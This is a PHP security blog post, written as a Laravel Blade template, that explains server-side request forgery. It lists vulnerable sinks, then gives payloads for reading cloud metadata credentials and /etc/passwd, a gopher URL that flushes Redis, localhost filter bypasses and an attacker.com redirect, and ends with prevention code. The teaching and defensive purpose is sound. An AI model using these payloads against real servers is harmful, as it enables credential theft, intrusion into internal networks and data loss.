@extends('layouts.app')
@section('title', 'SSRF in PHP - Notes')
@section('content')
<style>
    @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500&display=swap');
    :root{--bg:#0a0e17;--surface:#0f1522;--border:#1e2d45;--accent:#00c2ff;--accent2:#7b61ff;--text:#c9d8ef;--muted:#566a85;--green:#00e5a0;--red:#ff4d6d;--yellow:#f0b429;--orange:#ff9f43;}
    .post-root{background:var(--bg);font-family:'Syne',sans-serif;min-height:100vh;color:var(--text);}
    .post-topbar{border-bottom:1px solid var(--border);background:var(--surface);padding:12px 0;position:sticky;top:0;z-index:50;backdrop-filter:blur(8px);}
    .post-topbar-inner{max-width:960px;margin:0 auto;padding:0 32px;}
    .breadcrumb{display:flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);flex-wrap:wrap;}
    .breadcrumb a{color:var(--muted);text-decoration:none;} .breadcrumb a:hover{color:var(--accent);} .breadcrumb-sep{opacity:.35;font-size:10px;} .breadcrumb-current{color:var(--text);}
    .post-body{max-width:960px;margin:0 auto;padding:48px 32px 100px;}
    .article-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;}
    .article-card-inner{padding:48px;}
    .cat-badge{display:inline-flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:10px;padding:4px 12px;border-radius:3px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:24px;background:rgba(255,159,67,0.1);color:var(--orange);border:1px solid rgba(255,159,67,0.25);}
    .article-title{font-size:clamp(26px,4vw,38px);font-weight:800;color:#fff;line-height:1.15;letter-spacing:-.02em;margin-bottom:20px;}
    .meta-row{display:flex;flex-wrap:wrap;gap:20px;margin-bottom:28px;padding-bottom:28px;border-bottom:1px solid var(--border);}
    .meta-item{display:flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);} .meta-item svg{width:13px;height:13px;}
    .read-btn{display:inline-flex;align-items:center;gap:8px;background:transparent;border:1px solid var(--border);border-radius:6px;padding:9px 18px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--text);cursor:pointer;transition:all .2s;margin-bottom:40px;} .read-btn:hover{border-color:var(--orange);color:var(--orange);}
    .article-prose{line-height:1.8;font-size:15px;color:var(--text);}
    .article-prose h2{font-size:24px;font-weight:800;color:#fff;margin:48px 0 20px;}
    .article-prose h3{font-size:18px;font-weight:700;color:var(--orange);margin:40px 0 16px;font-family:'IBM Plex Mono',monospace;display:flex;align-items:center;gap:10px;} .article-prose h3::before{content:'//';color:var(--accent2);font-size:14px;opacity:.7;}
    .article-prose p{margin-bottom:16px;} .article-prose strong{color:#fff;} .article-prose a{color:var(--accent);text-decoration:underline;}
    .article-prose ul{list-style:none;padding:0;margin-bottom:20px;display:flex;flex-direction:column;gap:10px;} .article-prose ul li{padding-left:20px;position:relative;} .article-prose ul li::before{content:'›';position:absolute;left:0;color:var(--orange);font-size:16px;line-height:1.6;}
    .article-prose pre{background:#060a12;border:1px solid var(--border);border-radius:8px;padding:20px 24px;overflow-x:auto;margin:24px 0;position:relative;} .article-prose pre code{font-family:'IBM Plex Mono',monospace;font-size:13px;color:#00e5a0;background:none;padding:0;}
    .article-prose code{font-family:'IBM Plex Mono',monospace;font-size:13px;background:rgba(255,159,67,0.08);color:var(--orange);padding:2px 7px;border-radius:3px;border:1px solid rgba(255,159,67,0.2);}
    .copy-code{position:absolute!important;top:10px;right:10px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--muted);padding:4px 10px;font-family:'IBM Plex Mono',monospace;font-size:10px;cursor:pointer;} .copy-code:hover{border-color:var(--orange);color:var(--orange);} .copy-code.copied{border-color:var(--green);color:var(--green);}
    .callout{border-radius:8px;padding:18px 22px;margin:24px 0;display:flex;gap:14px;align-items:flex-start;} .callout-icon{font-size:18px;flex-shrink:0;margin-top:2px;} .callout p{margin:0;font-size:14px;line-height:1.7;} .callout strong{font-weight:700;}
    .callout-warning{background:rgba(240,180,41,0.06);border:1px solid rgba(240,180,41,0.25);} .callout-warning p{color:#f5d67a;} .callout-warning strong{color:var(--yellow);}
    .callout-info{background:rgba(255,159,67,0.05);border:1px solid rgba(255,159,67,0.2);} .callout-info p{color:var(--text);} .callout-info strong{color:var(--orange);}
    .callout-success{background:rgba(0,229,160,0.05);border:1px solid rgba(0,229,160,0.25);} .callout-success p{color:#7ff3cd;} .callout-success strong{color:var(--green);}
    .callout-danger{background:rgba(255,77,109,0.05);border:1px solid rgba(255,77,109,0.25);} .callout-danger p{color:#ffb3c0;} .callout-danger strong{color:var(--red);}
    @media(max-width:768px){.post-body{padding:24px 16px 60px;}.article-card-inner{padding:24px;}.post-topbar-inner{padding:0 16px;}}
</style>

<div class="post-root">
    <div class="post-topbar"><div class="post-topbar-inner">
        <nav class="breadcrumb">
            <a href="{{ route('home') }}">Home</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}">Notes</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}?category=php">PHP Security</a><span class="breadcrumb-sep">›</span>
            <span class="breadcrumb-current">SSRF in PHP</span>
        </nav>
    </div></div>

    <div class="post-body"><div class="article-card"><div class="article-card-inner">
        <div><span class="cat-badge">PHP Security</span></div>
        <h1 class="article-title">Server-Side Request Forgery (SSRF) in PHP</h1>
        <div class="meta-row">
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Youssef</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>{{ now()->format('d M Y') }}</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>0 views</div>
        </div>
        <button id="read-btn" class="read-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>Read Aloud</button>

        <div class="article-prose" id="article-content">

            <h2>SSRF in PHP Applications</h2>

            <h3>What is SSRF?</h3>
            <p>Server-Side Request Forgery (SSRF) occurs when an application fetches a remote resource at a URL controlled by the attacker. The server makes the request on the attacker's behalf, allowing access to internal services, cloud metadata, and localhost interfaces not reachable from the internet.</p>

            <h3>Vulnerable Patterns in PHP</h3>
            <pre><code>// file_get_contents() — most common SSRF sink in PHP
$data = file_get_contents($_GET['url']);
echo $data;

// curl with user-controlled URL
$ch = curl_init($_POST['url']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);

// SoapClient — blind SSRF
$client = new SoapClient($_GET['wsdl']);

// Redirects — SSRF via open redirect + HTTP client
$img = file_get_contents("https://trusted.com/redirect?to=" . $_GET['path']);</code></pre>

            <h3>Impact — What Can You Access?</h3>
            <ul>
                <li><strong>Cloud metadata</strong> — AWS, GCP, Azure credential endpoints</li>
                <li><strong>Internal services</strong> — databases, Redis, Elasticsearch, admin panels not exposed externally</li>
                <li><strong>Localhost services</strong> — <code>http://127.0.0.1:8080/admin</code>, <code>http://127.0.0.1:2379</code> (etcd)</li>
                <li><strong>Local file read</strong> — via <code>file://</code> protocol (if allow_url_fopen is on)</li>
                <li><strong>Port scanning</strong> — probe internal network topology</li>
            </ul>

            <h3>Exploitation — Cloud Metadata</h3>
            <pre><code>// AWS EC2 metadata (IMDSv1 — no auth required)
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/user-data/

// GCP metadata
?url=http://metadata.google.internal/computeMetadata/v1/instance/
?url=http://metadata.google.internal/computeMetadata/v1/project/

// Azure metadata
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01</code></pre>

            <h3>Exploitation — Internal Services</h3>
            <pre><code">// Access internal admin panel
?url=http://127.0.0.1:8080/admin
?url=http://192.168.1.1:9200/_cat/indices    // Elasticsearch
?url=http://127.0.0.1:6379                  // Redis (banner grab)
?url=http://127.0.0.1:2181                  // ZooKeeper

// Local file read (requires allow_url_fopen=On in some contexts)
?url=file:///etc/passwd
?url=file:///var/www/html/config.php

// Gopher protocol — can speak other protocols (redis, memcached, smtp)
?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall  // Redis FLUSHALL</code></pre>

            <h3>Filter Bypass Techniques</h3>
            <pre><code">// Bypass IP blocklist for 127.0.0.1 / localhost
?url=http://0.0.0.0:8080/
?url=http://0x7f000001:8080/              // hex
?url=http://2130706433:8080/              // decimal
?url=http://127.1:8080/                  // short form
?url=http://[::1]:8080/                  // IPv6
?url=http://localtest.me/                // resolves to 127.0.0.1

// Bypass domain whitelist via redirect
?url=http://attacker.com/redirect         // redirects to 169.254.169.254

// DNS rebinding — domain resolves to public IP first, then to internal IP
// Use: https://lock.cmpxchg8b.com/rebinder.html

// URL parsing confusion
?url=http://trusted.com@169.254.169.254/  // @ redirects
?url=http://169.254.169.254#trusted.com   // fragment

// IPv6-mapped IPv4
?url=http://[::ffff:169.254.169.254]/</code></pre>

            <h3>Blind SSRF Detection</h3>
            <p>When the response is not shown, use out-of-band techniques to confirm SSRF:</p>
            <pre><code">// Use Burp Collaborator or interactsh
?url=http://your-collaborator-id.oastify.com

// Or a simple ngrok tunnel:
ngrok http 8080
?url=http://abc123.ngrok.io/ssrf-test

// DNS lookup only — minimal payload
?url=http://ssrf-test.attacker.com</code></pre>

            <h3>Prevention</h3>
            <pre><code>// 1. Whitelist allowed domains
$allowed_hosts = ['api.example.com', 'cdn.example.com'];
$parsed = parse_url($_GET['url']);
if (!in_array($parsed['host'], $allowed_hosts, true)) {
    die('Not allowed');
}

// 2. Resolve DNS and check IP before fetching
$ip = gethostbyname($parsed['host']);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    die('Private IP not allowed');
}

// 3. Disable dangerous URL schemes in curl
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // disable redirects

// 4. php.ini — disable file:// in HTTP clients
allow_url_fopen = Off</code></pre>

            <div class="callout callout-warning">
                <div class="callout-icon">⚠️</div>
                <p><strong>Important:</strong> IP-based filters are not sufficient alone. DNS rebinding and redirect-based bypasses can circumvent them. The most robust defense is a whitelist of allowed destinations combined with disabling redirects and dangerous URL schemes.</p>
            </div>

            <div class="callout callout-success">
                <div class="callout-icon">✅</div>
                <p><strong>Key Insight:</strong> SSRF in cloud environments is particularly critical because the metadata endpoint at <code>169.254.169.254</code> provides IAM credentials that grant access to the entire cloud account. Always test SSRF for cloud metadata access on cloud-hosted applications.</p>
            </div>

        </div>
    </div></div></div>
</div>
@endsection
@section('scripts')
<script>
document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('pre').forEach(pre=>{pre.style.position='relative';const btn=document.createElement('button');btn.className='copy-code';btn.textContent='copy';pre.appendChild(btn);btn.addEventListener('click',()=>{const code=pre.querySelector('code')?.textContent??pre.textContent;navigator.clipboard.writeText(code).then(()=>{btn.textContent='copied!';btn.classList.add('copied');setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');},2000);});});});const r=document.getElementById('read-btn');const c=document.getElementById('article-content');if(r&&c){let reading=false;r.addEventListener('click',()=>{if(!reading){const u=new SpeechSynthesisUtterance(c.innerText);u.lang='en-US';speechSynthesis.speak(u);reading=true;r.textContent='Stop';u.onend=()=>{reading=false;r.textContent='Read Aloud'};}else{speechSynthesis.cancel();reading=false;r.textContent='Read Aloud';}});}});
</script>
@endsection
